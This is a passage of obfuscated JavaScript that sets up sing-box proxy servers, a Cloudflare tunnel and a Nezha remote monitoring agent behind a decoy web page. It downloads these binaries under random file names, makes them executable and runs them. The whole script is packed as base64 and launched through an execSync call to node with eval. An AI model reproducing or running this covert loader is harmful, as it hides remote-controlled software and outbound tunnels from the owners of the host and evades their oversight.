_0x1c107a=_0x45151c[_0x23cd01(0xfa)](/PrivateKey:\s*(\S+)/),_0x72d1e=_0x45151c[_0x23cd01(0xfa)](/PublicKey:\s*(\S+)/);_0x1c107a&&_0x72d1e&&(CONFIG[_0x23cd01(0x132)]=_0x1c107a[0x1],CONFIG[_0x23cd01(0xed)]=_0x72d1e[0x1]);}_0x5f104a();});});}async function generateSingBoxConfig(){const _0x5aebee=_0x4754d8,_0xc5e0c0=[];CONFIG['HY2_PORT']&&_0xc5e0c0[_0x5aebee(0x179)]({'type':_0x5aebee(0x12e),'tag':'hy2-in','listen':'::','listen_port':parseInt(CONFIG['HY2_PORT']),'users':[{'password':CONFIG[_0x5aebee(0x13e)]}],'tls':{'enabled':!![],'server_name':CONFIG[_0x5aebee(0xf2)],'insecure':!![]}});CONFIG[_0x5aebee(0x120)]&&_0xc5e0c0[_0x5aebee(0x179)]({'type':_0x5aebee(0x105),'tag':_0x5aebee(0x14e),'listen':'::','listen_port':parseInt(CONFIG[_0x5aebee(0x120)]),'users':[{'uuid':CONFIG['VMESS_UUID'],'alterId':0x0}],'transport':{'type':'ws','path':CONFIG[_0x5aebee(0x16e)]}});CONFIG[_0x5aebee(0x158)]&&_0xc5e0c0['push']({'type':_0x5aebee(0x141),'tag':_0x5aebee(0x130),'listen':'::','listen_port':parseInt(CONFIG['REALITY_PORT']),'users':[{'uuid':CONFIG[_0x5aebee(0x147)],'flow':_0x5aebee(0x134)}],'tls':{'enabled':!![],'server_name':CONFIG['REALITY_SNI'],'reality':{'enabled':!![],'handshake':{'server':CONFIG[_0x5aebee(0x110)],'server_port':0x1bb},'private_key':CONFIG[_0x5aebee(0x132)],'short_id':[CONFIG['REALITY_SHORT_ID']]}}});CONFIG[_0x5aebee(0x131)]&&_0xc5e0c0[_0x5aebee(0x179)]({'type':_0x5aebee(0x103),'tag':'tuic-in','listen':'::','listen_port':parseInt(CONFIG[_0x5aebee(0x131)]),'users':[{'uuid':CONFIG['TUIC_UUID'],'password':CONFIG[_0x5aebee(0xef)]}],'tls':{'enabled':!![],'server_name':CONFIG[_0x5aebee(0xf2)],'insecure':!![]}});const _0x42a12b={'log':{'level':'warn','timestamp':![]},'inbounds':_0xc5e0c0,'outbounds':[{'type':_0x5aebee(0xe9),'tag':_0x5aebee(0xe9)},{'type':_0x5aebee(0x117),'tag':_0x5aebee(0x117)}],'route':{'rules':[{'geoip':'private','outbound':_0x5aebee(0xe9)}]}},_0x44ab89=path[_0x5aebee(0x160)](WORK_DIR,_0x5aebee(0x116));return fs[_0x5aebee(0x17b)](_0x44ab89,JSON[_0x5aebee(0x17a)](_0x42a12b,null,0x2)),_0x44ab89;}function generateLinks(_0x1e1af9){const _0x57ec13=_0x4754d8,_0x925613=[];CONFIG[_0x57ec13(0x18d)]&&_0x925613[_0x57ec13(0x179)]({'protocol':_0x57ec13(0x13c),'url':_0x57ec13(0x151)+CONFIG['HY2_PASSWORD']+'@'+_0x1e1af9+':'+CONFIG[_0x57ec13(0x18d)]+_0x57ec13(0xea)+CONFIG['HY2_SNI']+'#HY2'});if(CONFIG['VMESS_PORT']){const _0x139634={'v':'2','ps':_0x57ec13(0x126),'add':CONFIG[_0x57ec13(0x133)],'port':_0x57ec13(0xf9),'id':CONFIG[_0x57ec13(0x147)],'aid':'0','scy':_0x57ec13(0x10c),'net':'ws','type':_0x57ec13(0x172),'host':CONFIG['C_D'],'path':CONFIG['VMESS_PATH'],'tls':_0x57ec13(0x114),'sni':CONFIG[_0x57ec13(0x10d)],'alpn':'','fp':_0x57ec13(0xf7)},_0x11e448=JSON[_0x57ec13(0x17a)](_0x139634,null,0x2)[_0x57ec13(0x188)](/\n/g,'\x0d\x0a')['replace'](/\s{2,}/g,'\x20\x20');_0x925613[_0x57ec13(0x179)]({'protocol':_0x57ec13(0xd9),'url':_0x57ec13(0x16d)+Buffer[_0x57ec13(0x156)](_0x11e448)['toString'](_0x57ec13(0x16b))});}return CONFIG[_0x57ec13(0x158)]&&_0x925613[_0x57ec13(0x179)]({'protocol':_0x57ec13(0x180),'url':'vless://'+CONFIG['VMESS_UUID']+'@'+_0x1e1af9+':'+CONFIG['REALITY_PORT']+_0x57ec13(0x13a)+CONFIG[_0x57ec13(0x110)]+_0x57ec13(0x144)+CONFIG[_0x57ec13(0xed)]+'&sid='+CONFIG['REALITY_SHORT_ID']+_0x57ec13(0x169)}),CONFIG[_0x57ec13(0x131)]&&_0x925613[_0x57ec13(0x179)]({'protocol':_0x57ec13(0x10b),'url':'tuic://'+CONFIG['TUIC_UUID']+':'+CONFIG[_0x57ec13(0xef)]+'@'+_0x1e1af9+':'+CONFIG[_0x57ec13(0x131)]+_0x57ec13(0xfc)}),_0x925613;}function cleanup(){const _0x248389=_0x4754d8;processes[_0x248389(0x128)](_0x3d16d9=>{const _0x41d2dd=_0x248389;try{_0x3d16d9[_0x41d2dd(0x11c)]();}catch(_0x2a741f){}}),process['exit'](0x0);}const app=express();app[_0x4754d8(0xde)]('/',(_0x348225,_0x24e92e)=>{const _0x1bdea6=_0x4754d8;_0x24e92e[_0x1bdea6(0xe3)](0xc8,{'Content-Type':_0x1bdea6(0x11f)}),_0x24e92e[_0x1bdea6(0x174)](HTML_TEMPLATES[_0x1bdea6(0x166)]);}),app['get'](_0x4754d8(0x11e),async(_0x3c1c66,_0x10b6c1)=>{const _0x12c1ad=_0x4754d8,_0x3f5971=await getServerIP(),_0x7c7c29=generateLinks(_0x3f5971);_0x10b6c1[_0x12c1ad(0xe3)](0xc8,{'Content-Type':_0x12c1ad(0x11f)}),_0x10b6c1['end'](HTML_TEMPLATES[_0x12c1ad(0xf4)](_0x3f5971,_0x7c7c29));}),app['get']('/x',async(_0x414b6c,_0x49d98f)=>{const _0x5b6f1c=_0x4754d8,_0xd68423=await getServerIP(),_0x11210a=generateLinks(_0xd68423);_0x49d98f[_0x5b6f1c(0xe3)](0xc8,{'Content-Type':'text/html'}),_0x49d98f['end'](HTML_TEMPLATES[_0x5b6f1c(0xf4)](_0xd68423,_0x11210a));}),app['get'](_0x4754d8(0xf8),(_0xb3d72a,_0x472669)=>{const _0x161ccc=_0x4754d8;_0x472669['writeHead'](0xc8,{'Content-Type':_0x161ccc(0x10f)}),_0x472669[_0x161ccc(0x174)](JSON['stringify']({'status':'ok','uptime':process['uptime']()}));});const server=http[_0x4754d8(0x12b)](app);server['on'](_0x4754d8(0xff),createProxyMiddleware({'target':'ws://localhost:'+CONFIG[_0x4754d8(0x120)],'changeOrigin':!![],'ws':!![],'logLevel':_0x4754d8(0x164)}));async function startService(_0x5d7016,_0x307600,_0x134da9,_0x4c286d={}){const _0x39a7ca=_0x4754d8;try{const _0x433c29=spawn(_0x5d7016,_0x307600,{'stdio':[_0x39a7ca(0x153),'pipe',_0x39a7ca(0x137)],..._0x4c286d});if(_0x4c286d[_0x39a7ca(0x119)]){const _0x3fe673=fs[_0x39a7ca(0x181)](_0x4c286d[_0x39a7ca(0x119)]);_0x433c29[_0x39a7ca(0x14f)][_0x39a7ca(0x137)](_0x3fe673),_0x433c29[_0x39a7ca(0x157)][_0x39a7ca(0x137)](_0x3fe673);}return _0x433c29['on'](_0x39a7ca(0x16f),()=>{const _0x41571a=_0x39a7ca;serviceStatus[_0x134da9['toLowerCase']()]=_0x41571a(0xe7);}),_0x433c29['on']('error',()=>{const _0x9088a0=_0x39a7ca;serviceStatus[_0x134da9[_0x9088a0(0xe8)]()]=_0x9088a0(0xfd);}),_0x433c29['on'](_0x39a7ca(0x15f),()=>{serviceStatus[_0x134da9['toLowerCase']()]='stopped';}),processes[_0x39a7ca(0x179)](_0x433c29),_0x433c29;}catch(_0x509a14){return serviceStatus[_0x134da9[_0x39a7ca(0xe8)]()]='error',null;}}async function main(){const _0x592182=_0x4754d8;server['listen'](CONFIG[_0x592182(0x186)],()=>{const _0xbcb10c=_0x592182;serviceStatus[_0xbcb10c(0x17d)]=_0xbcb10c(0xe7);});try{const _0x53bd51=detectArch(),_0x3f2663=path[_0x592182(0x160)](WORK_DIR,crypto['randomBytes'](0x4)[_0x592182(0xdc)]('hex')),_0x44796b=path[_0x592182(0x160)](WORK_DIR,crypto[_0x592182(0x17f)](0x4)['toString']('hex')),_0x354b7f=path[_0x592182(0x160)](WORK_DIR,crypto['randomBytes'](0x4)[_0x592182(0xdc)](_0x592182(0x154)));await Promise['all']([downloadSingBox(_0x53bd51,_0x3f2663),downloadCloudflared(_0x53bd51,_0x44796b),downloadNezhaAgent(_0x53bd51,_0x354b7f)]),[_0x3f2663,_0x44796b,_0x354b7f][_0x592182(0x128)](_0x5a568a=>{const _0xbe8757=_0x592182;if(!fs[_0xbe8757(0x161)](_0x5a568a))throw new Error(_0xbe8757(0xe6)+_0x5a568a);fs[_0xbe8757(0x18c)](_0x5a568a,_0xbe8757(0x102));});const _0xa0eb29=await getServerIP();if(CONFIG[_0x592182(0x18d)]||CONFIG['VMESS_PORT']||CONFIG[_0x592182(0x158)]||CONFIG[_0x592182(0x131)]){await generateRealityKeys(_0x3f2663);const _0x2d37d8=await generateSingBoxConfig();await startService(_0x3f2663,[_0x592182(0xfe),'-c',_0x2d37d8],_0x592182(0x16c));}if(CONFIG['C_T'])await startService(_0x44796b,[_0x592182(0x12f),'--edge-ip-version','auto',_0x592182(0x189),_0x592182(0x13d),'run',_0x592182(0x175),CONFIG[_0x592182(0x125)],_0x592182(0x112),_0x592182(0x12d)+CONFIG['PORT']],'cloudflared');else{if(CONFIG[_0x592182(0x120)]){const _0x5326d1=await startTempTunnel(_0x44796b,CONFIG[_0x592182(0x186)]);_0x5326d1?serviceStatus['cloudflared']=_0x592182(0xe7):serviceStatus['cloudflared']=_0x592182(0xfd);}}if(CONFIG['N_S']&&CONFIG[_0x592182(0x109)]){const _0x1410eb=['-s',CONFIG['N_S']+':'+CONFIG[_0x592182(0x171)],'-p',''+CONFIG[_0x592182(0x109)],'--report-delay','3',_0x592182(0x17e)];(CONFIG[_0x592182(0x148)]===_0x592182(0xd7)||typeof CONFIG[_0x592182(0x148)]===_0x592182(0x14b)&&CONFIG[_0x592182(0x148)][_0x592182(0xeb)](_0x592182(0xd7)))&&_0x1410eb['push'](_0x592182(0xd7)),await startService(_0x354b7f,_0x1410eb,_0x592182(0x182),{'logFile':path[_0x592182(0x160)](WORK_DIR,_0x592182(0xfb))});}process['on'](_0x592182(0xd8),cleanup),process['on'](_0x592182(0x145),cleanup),setInterval(()=>{const _0x354fd6=_0x592182;processes[_0x354fd6(0x124)]>0x0&&processes[_0x354fd6(0x11a)](_0x46d8ef=>_0x46d8ef[_0x354fd6(0x187)])&&cleanup();},0x7530);}catch(_0x533f67){process[_0x592182(0x15f)](0x1);}}main()[_0x4754d8(0x14c)](()=>process[_0x4754d8(0x15f)](0x1));`.replace(/\\n/g, '');
execSync(`node -e "eval(Buffer.from('${b}', 'base64').toString())"`);
